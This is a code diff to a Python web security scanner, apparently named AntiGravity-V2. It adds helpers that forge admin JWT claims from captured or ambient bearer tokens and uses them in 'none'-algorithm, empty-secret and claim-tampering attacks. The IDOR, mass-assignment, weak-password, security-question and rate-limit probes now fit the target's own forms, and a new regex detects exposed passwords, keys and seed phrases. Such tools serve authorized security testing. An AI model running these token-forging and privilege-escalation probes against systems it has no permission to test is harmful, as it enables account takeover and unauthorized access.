@@ -11,6 +11,9 @@ from urllib.parse import urlparse, parse_qs
 
 from core.domain.experiment import SecurityExperiment
 from core.execution.executors.base import ExecutionResult, ExecutionStatus, ExecutorBase
+from core.common import request_schema as rs
+from core.common import auth_shape as ash
+from core.common import target_shape as ts
 
 logger = logging.getLogger(__name__)
 
@@ -47,6 +50,44 @@ _URL_PARAM_NAMES = {"url", "uri", "link", "src", "source", "dest", "target",
                      "load", "open", "domain", "host", "site", "img", "image"}
 
 
+class _CapturedCtx:
+    """Adapter exposing captured traffic to core.common.request_schema helpers,
+    which read ``ctx.captured_requests``. There is no ambient ``ctx`` in this
+    module — captured requests live in ``experiment.input_parameters``."""
+    __slots__ = ("captured_requests",)
+
+    def __init__(self, experiment: SecurityExperiment):
+        cr = experiment.input_parameters.get("captured_requests") or []
+        self.captured_requests = cr if isinstance(cr, list) else []
+
+
+def _templated_admin_claims(sample: Dict[str, Any]) -> Dict[str, Any]:
+    """Forge admin claims from an observed token's structure when available;
+    otherwise fall back to the canonical literal claim set."""
+    now = int(time.time())
+    fallback = {"sub": "1", "role": "admin", "isAdmin": True,
+                "iat": now, "exp": now + 3600}
+    if not isinstance(sample, dict) or not sample:
+        return fallback
+    claims = dict(sample)
+    escalated = False
+    for k in list(claims.keys()):
+        lk = str(k).lower()
+        if lk in ("role", "roles", "scope", "authorities", "user_type",
+                  "usertype", "tier", "level", "groups"):
+            claims[k] = "admin"
+            escalated = True
+        elif lk in ("isadmin", "admin", "is_admin"):
+            claims[k] = True
+            escalated = True
+    if not escalated:
+        claims["role"] = "admin"
+        claims["isAdmin"] = True
+    claims["iat"] = now
+    claims["exp"] = now + 3600
+    return claims
+
+
 class GenericHTTPExecutor(ExecutorBase):
 
     def validate_inputs(self, inputs: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
@@ -60,12 +101,24 @@ class GenericHTTPExecutor(ExecutorBase):
                data: Optional[bytes] = None) -> Tuple[int, str, Dict[str, str]]:
         hdrs = headers or {"User-Agent": "AntiGravity-V2/1.0"}
         req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
+        import http.client as _httpclient
         try:
             with urllib.request.urlopen(req, timeout=self.timeout_seconds) as resp:
-                body = resp.read().decode("utf-8", errors="replace")[:8192]
+                try:
+                    raw = resp.read()
+                except _httpclient.IncompleteRead as _ir:
+                    # Server under-delivered vs its Content-Length (or closed
+                    # early) — common on buggy/static endpoints. Use what arrived
+                    # instead of failing the whole probe.
+                    raw = _ir.partial
+                body = raw.decode("utf-8", errors="replace")[:8192]
                 return resp.status, body, dict(resp.headers)
         except urllib.error.HTTPError as e:
-            body = e.read().decode("utf-8", errors="replace")[:8192] if e.fp else ""
+            try:
+                raw = e.read() if e.fp else b""
+            except _httpclient.IncompleteRead as _ir:
+                raw = _ir.partial
+            body = raw.decode("utf-8", errors="replace")[:8192]
             return e.code, body, dict(e.headers)
         except (urllib.error.URLError, TimeoutError, ConnectionError, OSError) as exc:
             # Network-level failure — the target is unreachable / timed out /
@@ -89,6 +142,36 @@ class GenericHTTPExecutor(ExecutorBase):
         return self._url_from_experiment(experiment).rstrip("/")
 
     # ── Discovery helpers ──────────────────────────────────────────────
+
+    def _rs_ctx(self, experiment: SecurityExperiment) -> _CapturedCtx:
+        """ctx adapter for request_schema/target_shape helpers."""
+        return _CapturedCtx(experiment)
+
+    def _captured_bearer_token(self, experiment: SecurityExperiment) -> str:
+        """A legitimately-captured bearer/JWT token, if one is reachable, for
+        reading real claim structure before forging. Empty string when none."""
+        ip = experiment.input_parameters
+        tok = ip.get("auth_token") or ip.get("token")
+        if tok:
+            return str(tok)
+        for c in (ip.get("captured_requests") or []):
+            d = c if isinstance(c, dict) else (getattr(c, "__dict__", {}) or {})
+            h = d.get("headers") or {}
+            if isinstance(h, dict):
+                for k, v in h.items():
+                    if str(k).lower() == "authorization" and str(v).startswith("Bearer "):
+                        return str(v)[len("Bearer "):]
+        try:
+            from core.utils.scan_flags import allow_ambient_auth
+            if allow_ambient_auth():
+                from core.execution.executors.auth_registry import get_active_auth
+                active = get_active_auth() or {}
+                ah = (active.get("headers") or {}).get("Authorization", "")
+                if ah.startswith("Bearer "):
+                    return ah[len("Bearer "):]
+        except Exception:
+            pass
+        return ""
 
     def _discovered_endpoints(self, experiment: SecurityExperiment) -> List[str]:
         eps = experiment.input_parameters.get("endpoints", [])
@@ -278,6 +361,54 @@ class InfoDisclosureExecutor(GenericHTTPExecutor):
             "status": status,
             "disclosed_headers": disclosed,
             "body_snippet": body[:512] if status >= 400 else "",
+        })
+        elapsed = (time.monotonic() - start) * 1000
+        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
+                               execution_time_ms=elapsed)
+
+
+class ApiHygieneExecutor(GenericHTTPExecutor):
+    """Generic API response-hygiene checks — excessive data exposure and missing
+    pagination — derived purely from response SHAPE (no target-specific fields
+    or paths). Covers the api_* catalog tests that have no dedicated probe."""
+
+    _SENSITIVE_KEY = re.compile(
+        r"(?i)\"[^\"]*(pass(?:word|wd)?|pwd|secret|token|api[_-]?key|ssn|"
+        r"credit[_-]?card|card[_-]?number|cvv|private[_-]?key|seed|mnemonic|"
+        r"otp|auth[_-]?token|session[_-]?id)[^\"]*\"\s*:")
+    _PAGINATION_HINT = re.compile(
+        r"(?i)\"(page|per[_-]?page|limit|offset|cursor|next|total|has[_-]?more|pagination)\"")
+
+    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
+        url = self._url_from_experiment(experiment)
+        if not url:
+            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
+                                   error_code="NO_URL", error_message="No URL to probe")
+        start = time.monotonic()
+        status, body, resp_headers = self._probe(url)
+        ctype = (resp_headers.get("Content-Type")
+                 or resp_headers.get("content-type") or "").lower()
+        findings: List[Dict[str, Any]] = []
+        is_json = "json" in ctype or (body[:1] in ("[", "{"))
+        if is_json and body:
+            for kw in sorted({m.group(1).lower() for m in self._SENSITIVE_KEY.finditer(body)}):
+                findings.append({"test": "excessive_data_exposure", "indicator": kw})
+            try:
+                data = json.loads(body)
+            except Exception:
+                data = None
+            arr = None
+            if isinstance(data, list):
+                arr = data
+            elif isinstance(data, dict):
+                arr = next((v for v in data.values() if isinstance(v, list)), None)
+            if isinstance(arr, list) and len(arr) >= 50 and not self._PAGINATION_HINT.search(body):
+                findings.append({"test": "missing_pagination", "items": len(arr)})
+        vuln = bool(findings)
+        evidence = self.collect_evidence({
+            "status": status, "content_type": ctype, "vulnerable": vuln,
+            "api_hygiene_findings": findings[:20], "findings_count": len(findings),
+            "body_snippet": body[:400],
         })
         elapsed = (time.monotonic() - start) * 1000
         return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
@@ -537,23 +668,22 @@ class JWTExecutor(GenericHTTPExecutor):
             s = b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
             return f"{h}.{p}.{s}"
 
+        # Template forged claims from a legitimately-captured token's structure
+        # when one is available; else fall back to the canonical literal claims.
+        _claims = _templated_admin_claims(
+            ash.decode_jwt_claims(self._captured_bearer_token(experiment)))
+        _claims_tamper = {**_claims, "sub": "2" if str(_claims.get("sub")) != "2" else "3"}
         tokens = {
-            "none_alg": make_jwt(
-                {"alg": "none", "typ": "JWT"},
-                {"sub": "1", "role": "admin", "iat": 1700000000, "exp": 9999999999}),
-            "empty_secret": make_jwt(
-                {"alg": "HS256", "typ": "JWT"},
-                {"sub": "1", "role": "admin", "iat": 1700000000, "exp": 9999999999}),
-            "claim_tamper": make_jwt(
-                {"alg": "HS256", "typ": "JWT"},
-                {"sub": "2", "role": "admin", "isAdmin": True, "iat": 1700000000, "exp": 9999999999}),
+            "none_alg": make_jwt({"alg": "none", "typ": "JWT"}, _claims),
+            "empty_secret": make_jwt({"alg": "HS256", "typ": "JWT"}, _claims),
+            "claim_tamper": make_jwt({"alg": "HS256", "typ": "JWT"}, _claims_tamper),
         }
 
         # Test on all auth/user/admin endpoints discovered
         auth_eps = self._to_paths(
             self._endpoints_by_role(experiment, "auth", "user", "admin"), base)
         if not auth_eps:
-            auth_eps = ["/api/me", "/api/users", "/admin", "/dashboard", "/api/profile"]
+            return _no_endpoints_result("no auth/user/admin endpoints for JWT attacks")
 
         for token_name, token_val in tokens.items():
             for ep in auth_eps[:15]:
@@ -983,13 +1113,16 @@ class IDORExecutor(GenericHTTPExecutor):
                     findings.append({"test": f"idor_{method.lower()}", "path": swapped_path,
                                      "status": status})
 
-        # If no ID endpoints discovered, test generic patterns on the base
+        # If our numeric matcher found no ID endpoints, only guess the generic
+        # /api/users/{i} pattern when discovery shows the target actually exposes
+        # id-bearing paths (UUID/ObjectId/etc. the numeric matcher missed).
         if not id_endpoints:
-            for i in range(1, 4):
-                status, body, _ = self._probe(f"{base}/api/users/{i}")
-                if status == 200 and len(body) > 10:
-                    findings.append({"test": "idor_generic", "path": f"/api/users/{i}",
-                                     "status": status, "body_snippet": body[:256]})
+            if any(ts.id_path_segments(ep) for ep in self._discovered_endpoints(experiment)):
+                for i in range(1, 4):
+                    status, body, _ = self._probe(f"{base}/api/users/{i}")
+                    if status == 200 and len(body) > 10:
+                        findings.append({"test": "idor_generic", "path": f"/api/users/{i}",
+                                         "status": status, "body_snippet": body[:256]})
 
         evidence = self.collect_evidence({
             "idor_findings": findings, "findings_count": len(findings),
@@ -1023,13 +1156,19 @@ class MassAssignmentExecutor(GenericHTTPExecutor):
         # 1. Registration — discovered auth/user endpoints
         reg_eps = self._to_paths(
             self._endpoints_by_role(experiment, "auth", "user"), base)
-        if not reg_eps:
-            reg_eps = ["/api/users", "/api/register", "/api/signup"]
+        # 2. Profile update — PUT/PATCH on user/config endpoints
+        update_eps = self._to_paths(
+            self._endpoints_by_role(experiment, "user", "config"), base)
+        if not reg_eps and not update_eps:
+            return _no_endpoints_result("no auth/user endpoints for mass-assignment")
+
+        # Registration body mirrors the captured register form (real username /
+        # password / confirm field names); the mass-assignment PRIV_FIELDS merge on top.
+        reg_body = rs.build_register_body(
+            self._rs_ctx(experiment), f"masstest_{ts}@test.com", "Test1234!")
         for ep in reg_eps[:6]:
             for extra in self.PRIV_FIELDS:
-                payload = {"email": f"masstest_{ts}@test.com",
-                           "password": "Test1234!", "passwordRepeat": "Test1234!",
-                           **extra}
+                payload = {**reg_body, **extra}
                 status, body, _ = self._probe(
                     f"{base}{ep}", method="POST",
                     headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
@@ -1043,11 +1182,7 @@ class MassAssignmentExecutor(GenericHTTPExecutor):
                             "status": status, "body_snippet": body[:256],
                         })
 
-        # 2. Profile update — PUT/PATCH on user/config endpoints
-        update_eps = self._to_paths(
-            self._endpoints_by_role(experiment, "user", "config"), base)
-        if not update_eps:
-            update_eps = ["/api/profile", "/api/me", "/api/account"]
+        # 2. Profile update — PUT/PATCH on user/config endpoints (discovered above)
         for ep in update_eps[:6]:
             for extra in self.PRIV_FIELDS[:3]:
                 for method in ["PUT", "PATCH"]:
@@ -1458,10 +1593,17 @@ class PasswordPolicyExecutor(GenericHTTPExecutor):
         hdrs = {**headers, "Content-Type": "application/json"}
         for ep in target_eps[:5]:
             full = base + ep
+            _cf = rs.credential_fields(self._rs_ctx(experiment),
+                                       ("register", "signup", "users", "account"))
+            _declares_username = "username" in [str(k).lower()
+                                                for k in _cf.get("captured_keys", [])]
             for i, pw in enumerate(self.WEAK):
                 email = f"pwtest_{ts}_{i}@example.com"
-                body = json.dumps({"email": email, "password": pw,
-                                   "passwordRepeat": pw, "username": email.split("@")[0]}).encode()
+                body_d = rs.build_register_body(self._rs_ctx(experiment), email, pw)
+                # Add a separate username only when the target's form declares one.
+                if _declares_username and "username" not in body_d:
+                    body_d["username"] = email.split("@")[0]
+                body = json.dumps(body_d).encode()
                 status, resp, _ = self._probe(full, method="POST", headers=hdrs, data=body)
                 if status in (200, 201):
                     findings.append({"test": "weak_password_accepted", "path": ep,
@@ -1504,7 +1646,8 @@ class RateLimitExecutor(GenericHTTPExecutor):
             statuses = []
             hit_429 = False
             hdrs = {**headers, "Content-Type": "application/json"}
-            body = json.dumps({"email": "ratetest@example.com", "password": "wrong"}).encode()
+            body = json.dumps(rs.build_login_body(
+                self._rs_ctx(experiment), "ratetest@example.com", "wrong")).encode()
             for i in range(self.BURST):
                 status, _, _ = self._probe(full, method="POST", headers=hdrs, data=body)
                 statuses.append(status)
@@ -1937,8 +2080,10 @@ class AdvancedJWTExecutor(GenericHTTPExecutor):
         if not auth_eps:
             return _no_endpoints_result("no auth/user/admin endpoints for JWT attacks")
 
-        admin_claims = {"sub": "1", "role": "admin", "isAdmin": True,
-                        "iat": int(time.time()), "exp": int(time.time()) + 3600}
+        # Template forged claims from a real captured token's structure when
+        # available; else fall back to the canonical literal claims.
+        admin_claims = _templated_admin_claims(
+            ash.decode_jwt_claims(self._captured_bearer_token(experiment)))
 
         tokens = {}
         # (a) RS256 → HS256 key confusion
@@ -2708,13 +2853,22 @@ class SecurityQuestionSolverExecutor(GenericHTTPExecutor):
                                                 for k in ("answer", "reset", "verify"))]
             answer_eps = answer_eps or eps[:2]
             hdrs = {**headers, "Content-Type": "application/json"}
+            _answer_field = rs.credential_fields(
+                self._rs_ctx(experiment),
+                ("reset", "forgot", "recover", "security")).get("answer_field")
             for ans in answers[: self.ANSWERS_PER_QUESTION]:
                 for aep in answer_eps[:3]:
-                    body = json.dumps({
+                    body_d = {
                         "email": user.get("email", ""),
                         "user": user.get("username", ""),
-                        "answer": ans, "securityAnswer": ans, "response": ans,
-                    }).encode()
+                    }
+                    if _answer_field:
+                        body_d[_answer_field] = ans
+                    else:
+                        # fall back to the common answer aliases
+                        for _af in rs.ANSWER_ALIASES:
+                            body_d[_af] = ans
+                    body = json.dumps(body_d).encode()
                     status, resp_body, _ = self._probe(base + aep, method="POST",
                                                        headers=hdrs, data=body)
                     if status in (200, 201):
@@ -3368,23 +3522,49 @@ class SteganographyDetector(GenericHTTPExecutor):
         if not images:
             return _no_endpoints_result("no image assets discovered")
 
+        import os as _os
+        _scan_id = _os.getenv("ANTIGRAVITY_SCAN_ID", "") or ""
+
+        def _save_artifact(kind, name, content, mime):
+            """Persist extracted bytes/text so the UI can offer a download button."""
+            if not _scan_id or not content:
+                return 0
+            try:
+                from core.database.pg_store import ScanArtifactRepo
+                return ScanArtifactRepo.insert(_scan_id, kind, name, content,
+                                               mime_type=mime,
+                                               metadata={"source_path": name})
+            except Exception:
+                return 0
+
         for path in images[: self.MAX_IMAGES]:
             raw = self._fetch_bytes(base + path, headers)
             if len(raw) < 128:
                 continue
+            _bn = path.split("?")[0].rstrip("/").split("/")[-1] or "image"
             extra = self._appended_data(raw)
             if extra:
                 snippet = extra[:200].decode("utf-8", errors="replace")
+                # Save the FULL extracted bytes as a downloadable artifact.
+                aid = _save_artifact("stego", f"stego_appended_{_bn}.bin", bytes(extra),
+                                     "application/octet-stream")
                 findings.append({"test": "stego_appended_data", "path": path,
-                                 "size": len(extra), "snippet": snippet})
+                                 "size": len(extra), "snippet": snippet,
+                                 "recovered_full": extra[:4000].decode("utf-8", errors="replace"),
+                                 "artifact_id": aid or None,
+                                 "download_name": f"stego_appended_{_bn}.bin"})
             exif_hit = self._exif_scan(raw)
             if exif_hit:
                 findings.append({"test": "stego_exif_keyword", "path": path,
                                  "exif": exif_hit})
             lsb = self._lsb_extract(raw)
             if lsb and any(k in lsb.lower() for k in _FLAG_KEYWORDS):
+                aid = _save_artifact("stego", f"stego_lsb_{_bn}.txt", lsb, "text/plain")
                 findings.append({"test": "stego_lsb_recovered", "path": path,
-                                 "recovered_snippet": lsb})
+                                 "recovered_snippet": lsb[:200],
+                                 "recovered_full": lsb[:4000],
+                                 "artifact_id": aid or None,
+                                 "download_name": f"stego_lsb_{_bn}.txt"})
 
         evidence = self.collect_evidence({
             "stego_findings": findings, "findings_count": len(findings),
@@ -4731,7 +4911,8 @@ class HeaderRateLimitBypassExecutor(GenericHTTPExecutor):
             return _no_endpoints_result("no auth endpoints for rate-limit bypass")
 
         hdrs = {**headers, "Content-Type": "application/json"}
-        body = json.dumps({"email": "rltest@example.com", "password": "wrong"}).encode()
+        body = json.dumps(rs.build_login_body(
+            self._rs_ctx(experiment), "rltest@example.com", "wrong")).encode()
 
         for ep in auth_eps[:2]:
             # Drive to 429
